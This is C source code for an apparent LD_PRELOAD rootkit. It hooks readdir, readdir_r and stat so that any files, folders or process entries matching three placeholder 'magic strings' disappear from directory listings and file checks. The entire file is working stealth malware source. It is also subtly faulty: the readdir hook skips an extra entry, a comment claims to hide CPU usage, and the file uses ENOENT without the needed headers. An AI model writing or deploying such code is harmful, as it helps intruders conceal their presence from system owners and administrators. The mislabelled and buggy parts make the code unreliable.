#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <unistd.h>

// Define the magic strings to hide processes, folders, files, and CPU usage
const char* magic_string1 = "my_magic_string1";
const char* magic_string2 = "my_magic_string2";
const char* magic_string3 = "my_magic_string3";

// Function pointers to the original library functions
typedef struct dirent* (*readdir_t)(DIR*);
typedef int (*readdir_r_t)(DIR*, struct dirent*, struct dirent**);
typedef int (*stat_t)(const char*, struct stat*);

// Function to hide processes, folders, and files
struct dirent* readdir(DIR* dirp) {
    readdir_t original_readdir;
    original_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");

    struct dirent* entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, magic_string1) == 0 ||
            strcmp(entry->d_name, magic_string2) == 0 ||
            strcmp(entry->d_name, magic_string3) == 0) {
            entry = original_readdir(dirp);
            continue;
        }
        return entry;
    }
    return NULL;
}

// Function to hide CPU usage
int readdir_r(DIR* dirp, struct dirent* entry, struct dirent** result) {
    readdir_r_t original_readdir_r;
    original_readdir_r = (readdir_r_t)dlsym(RTLD_NEXT, "readdir_r");

    int ret;
    while ((ret = original_readdir_r(dirp, entry, result)) == 0) {
        if (*result == NULL)
            break;
        if (strcmp((*result)->d_name, magic_string1) == 0 ||
            strcmp((*result)->d_name, magic_string2) == 0 ||
            strcmp((*result)->d_name, magic_string3) == 0)
            continue;
        return 0;
    }
    return ret;
}

// Function to hide file access
int stat(const char* path, struct stat* buf) {
    stat_t original_stat;
    original_stat = (stat_t)dlsym(RTLD_NEXT, "stat");

    if (strcmp(path, magic_string1) == 0 ||
        strcmp(path, magic_string2) == 0 ||
        strcmp(path, magic_string3) == 0)
        return -ENOENT; // Return "No such file or directory" error

    return original_stat(path, buf);
}
